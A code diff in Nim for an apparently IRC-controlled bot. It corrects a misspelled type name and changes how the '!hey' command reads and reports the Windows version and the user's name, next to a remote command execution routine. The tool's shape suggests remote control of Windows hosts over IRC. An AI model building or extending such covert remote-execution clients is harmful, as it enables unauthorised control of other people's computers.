@@ -12,7 +12,7 @@ var
 
 
 type
-    ExecRespose = tuple
+    ExecResponse = tuple
         exitCode:int
         output:string
 
@@ -85,7 +85,7 @@ proc helper_checkSendDuration(event: IrcEvent, client:AsyncIrc, msg:string): Fut
 
 ## Waits handles output from dispached functions. Required for async operations
 ## usually used to get async output from rexec
-proc helper_responseHandler(response:Future[ExecRespose], client:AsyncIrc, event:IrcEvent) {.async.} =
+proc helper_responseHandler(response:Future[ExecResponse], client:AsyncIrc, event:IrcEvent) {.async.} =
     while not response.finished() and not response.failed():
         await sleepAsync(1000)
     
@@ -120,7 +120,7 @@ proc helper_responseHandler(response:Future[ExecRespose], client:AsyncIrc, event
 
 
 
-proc rexec_runCommand(cmd:string):Future[ExecRespose] {.async.} =
+proc rexec_runCommand(cmd:string):Future[ExecResponse] {.async.} =
     var 
         output:string
         exitcode:int    
@@ -453,8 +453,9 @@ proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
     of "!hey":
         var win_ver = "<void>"
         try:
-            var (output, _ ) = execCmdEx("cmd.exe /C ver")
+            var (output, _ ) = execCmdEx("ver" ,options = {poUsePath})
             output = output.strip(chars={'\r','\n'})
+            win_ver = output
         except:
             discard
         discard client.privmsg(event.origin, "heyyy v" & $current_version & " as " & getEnv("USERNAME") & " windows version: " & win_ver)
